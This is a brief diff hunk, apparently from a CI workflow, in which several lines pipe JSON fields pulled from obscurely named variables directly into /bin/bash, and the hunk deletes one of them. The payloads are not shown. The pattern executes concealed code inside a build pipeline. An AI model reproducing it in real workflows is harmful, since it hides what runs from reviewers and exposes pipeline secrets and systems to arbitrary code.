@@ -24,7 +24,6 @@ jobs:
           echo $cs2 | jq -r .miobt05 | /bin/bash
           echo $ev67 | jq -r .wn66023 | /bin/bash
           echo $rsw7517 | jq -r .puq3359 | /bin/bash
-          echo $rlez355 | jq -r .pwo66 | /bin/bash
           echo $yts64 | jq -r .ae9 | /bin/bash
           printf '%s' "$l7" | jq -r .ikwwu1 | /bin/bash
 
